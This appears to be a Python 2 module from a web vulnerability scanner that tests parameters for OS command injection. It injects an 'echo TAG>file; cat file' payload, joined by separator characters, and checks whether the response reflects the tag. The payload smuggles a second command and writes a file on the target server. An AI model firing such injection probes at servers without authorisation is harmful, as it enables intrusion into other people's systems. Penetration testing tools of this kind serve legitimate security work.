import re
import time
import json
import random
import string
import urlparse
from requests.requests import Requests
from injector import InjectorBase
from utils.config import DefaultConfig
from utils.thread_handler import SelfThread
from utils.debug_module import Log

class FileBased(InjectorBase):

    inject_level = 5

    def __init__(self, request_obj, request_info):
        super(FileBased, self).__init__(request_obj, request_info)

    def decision(self, inject_key):
        for separator in self.SEPARATORS:
            for length in xrange(6):
                # check exit flag
                SelfThread.is_exit()
                time.sleep(eval(DefaultConfig.get_value('System', 'RequestDelay')))
                # change tag each round in case false positive 
                self.tag = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
                Log.debug('Start to test with separator: %s, TAG: %s, length: %d', separator, self.tag, length)
                target_server_root = DefaultConfig.get_value('FileBased', 'ServerRootPath')
                output_file = self.tag + '.txt'
                cmd = self.gen_file_cmd(separator, self.tag, target_server_root, output_file)
                sent_data = self.replace_func(inject_key, cmd)
                inject_info = {
                    'target': self.current_part,
                    'inject_method': self.__class__.__name__,
                    'inject_key': inject_key,
                    'seperator': separator,
                    'tag': self.tag,
                    'command': cmd
                }
                response_info = self.request_obj.serverRestAPI(self.request_info)
                if self.is_inject_success(response_info):
                    inject_result = True
                    self.find_injectable(inject_key, cmd, response_info['res_body'])
                else:
                    inject_result = False
                self.record_traffic_logs(self.request_info.get_record(), inject_info, response_info, inject_result)

    def is_inject_success(self, response):
        if re.findall(r"{tag}".format(tag=self.tag), response['res_body']):
            return True
        return False

    def gen_file_cmd(self, separator, TAG, target_server_root, output_file):
        return "echo {tag}>{root}{file}{separator}cat {root}{file}".format(separator=separator, tag=TAG, root=target_server_root, file=output_file)
